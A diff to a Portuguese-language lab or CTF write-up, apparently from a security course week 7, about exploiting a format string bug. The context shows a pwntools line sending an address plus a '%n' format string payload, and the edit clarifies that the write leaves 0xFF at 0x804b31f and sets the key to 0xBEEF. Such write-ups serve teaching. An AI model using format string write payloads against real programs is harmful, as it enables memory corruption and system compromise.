@@ -123,7 +123,7 @@ p.sendline(b"AAAA\x1f\xb3\x04\x08%.12513271x%n")
 p.interactive()
 ```
 
-Desta forma, o endereço **0x804b31f**, que está diretamente acima na stack em relação ao endereço **0x804b320**, e o valor da key terá **0xBEEF**.
+Desta forma, o endereço **0x804b31f**, que está diretamente acima na stack em relação ao endereço **0x804b320**, terá o valor **0xFF**, e o valor da key será **0xBEEF**.
 
 ![image](/Semana_7/images/flaghard.png)
 
